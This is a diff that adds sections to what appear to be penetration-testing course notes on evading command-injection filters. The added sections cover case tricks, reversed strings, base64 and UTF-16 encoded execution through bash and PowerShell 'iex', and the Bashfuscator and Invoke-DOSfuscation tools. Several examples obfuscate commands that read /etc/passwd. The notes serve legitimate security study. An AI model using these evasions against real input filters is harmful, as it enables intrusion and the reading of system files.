@@ -142,3 +142,147 @@ There are also some Windows-only characters that we can insert in the middle of 
 who^ami
 ```
 
+# Advanced Command Obfuscation
+
+## Case Manipulation
+**Case Manipulation** is like inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word, as <span style="color:rgb(192, 0, 0)">Linux systems are case-sensitive</span>. 
+
+```PowerShell
+WhOaMi
+```
+
+For Linux, we have to get creative and find a command that turns the command into an all-lowercase word. One working example is:
+
+```sh
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+```
+
+We can use many other commands for the same purpose like the following:
+
+```sh
+$(a="WhOaMi";printf %s "${a,,}")
+```
+
+## Reversed Commands
+
+```sh
+echo 'whoami' | rev
+
+imaohw
+```
+
+Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:
+
+```sh
+$(rev<<<'imaohw')
+
+# we will get the username in the output
+```
+
+The same can be applied in `Windows.` We can first reverse a string, as follows:
+
+```powershell
+"whoami"[-1..-20] -join '' 
+
+imaohw
+```
+
+We can use the below command to execute a reversed string with PowerShell sub-shell (`iex "$()"`), as follows:
+
+```powershell
+iex "$('imaohw'[-1..-20] -join '')"
+```
+
+## Encoded Commands
+
+We can use different types of encoding tools like `base64` or `xxd` (for hex encoding).
+
+```sh
+echo -n 'cat /etc/passwd | grep 33' | base64
+
+Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+```
+
+Now we can create a command that will decode the encoded string in a sub-shell and then pass it to bash to be executed, as follows:
+
+```sh
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+
+![[cmdinj_filters_commands_6.jpg]]
+
+We can use the same technique on Windows as well
+
+```powershell
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+```
+
+We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:
+
+```sh
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+```
+
+Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:
+
+```PowerShell
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+
+
+---
+
+# Evasion Tools
+
+## Linux (Bashfuscator)
+
+```sh title="Bashfuscator Installation"
+git clone https://github.com/Bashfuscator/Bashfuscator
+
+pip3 install setuptools==65
+
+python3 setup.py install --user
+```
+
+```bash title="Bashfuscator Usage"
+cd ./bashfuscator/bin/
+
+./bashfuscator -h
+
+./bashfuscator -c 'cat /etc/passwd'
+```
+
+```bash title="Last Command Output"
+${*/+27\[X\(} ...SNIP... ${*~}
+```
+
+We can use some flags with the tool to get simpler and shorter obfuscated commands:
+
+```sh title="Bashfuscator Usage with Flags"
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+```
+
+```sh title="Last Command Output"
+eval "$(W0=(w \ t e c p s a / d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
+```
+
+## Windows (DOSfuscation)
+
+```PowerShell title="DOSfuscation Setup & Usage"
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+
+cd Invoke-DOSfuscation
+
+Import-Module .\Invoke-DOSfuscation.psd1
+
+Invoke-DOSfuscation
+
+Invoke-DOSfuscation> help
+
+Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
+
+Invoke-DOSfuscation> encoding
+
+Invoke-DOSfuscation\Encoding> 1
+```
+
